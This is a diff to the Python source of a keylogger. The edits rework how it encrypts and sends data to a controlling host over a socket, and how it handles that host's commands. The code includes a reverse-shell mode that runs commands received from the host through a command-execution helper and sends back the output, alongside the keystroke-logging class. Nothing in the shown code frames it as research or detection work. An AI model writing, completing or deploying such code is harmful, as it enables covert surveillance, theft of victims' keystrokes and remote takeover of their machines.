@@ -127,10 +127,10 @@ class Keylogger:
             except socket.error as e:
                 print(e)
 
-    def send_to_host(self, data: str | bytes, dtype:str):
+    def send_to_host(self, data: str | bytes):
         if isinstance(data, str):
             data = data.encode("utf-8")
-        encrypted_data = utils.encrypt(data=data, dtype=dtype)
+        encrypted_data = utils.encrypt(data)
 
         try:
             self.sock.sendall(encrypted_data)
@@ -139,8 +139,8 @@ class Keylogger:
             self.connect_to_host()
 
     def receive_from_host(self):
-        recv = self.sock.recv(1024)
-        plaintext, dtype = utils.decrypt(recv)
+        recv = self.sock.recv(utils.BUFFSIZE)
+        plaintext = utils.decrypt(recv).decode("utf-8")
         return plaintext
 
 #--------------- POLLING FUNCTIONS ---------------#
@@ -178,7 +178,6 @@ class Keylogger:
 
     def stop(self):
         self.active = False
-        self.send_to_host(data="terminated", dtype="msg")
         self.sock.close()
 
 
@@ -196,16 +195,17 @@ if __name__ == "__main__":
             if reverse_shell:
                 if recv == "exit":
                     reverse_shell = False
-                    keylogger.send_to_host(data="reverse shell deactivated", dtype="msg")
+                    keylogger.send_to_host("reverse shell deactivated")
                 else:
-                    keylogger.send_to_host(data=utils.execute_command(recv), dtype="msg")
+                    keylogger.send_to_host(utils.execute_command(recv))
             else:
                 if recv == "exit":
+                    keylogger.send_to_host("terminated")
                     keylogger.stop()
                     break
                 elif recv == "shell":
                     reverse_shell = True
-                    keylogger.send_to_host(data="reverse shell activated", dtype="msg")
+                    keylogger.send_to_host("reverse shell activated")
                 else:
-                    keylogger.send_to_host(data="received", dtype="msg")
+                    keylogger.send_to_host("received")
                     print(recv)
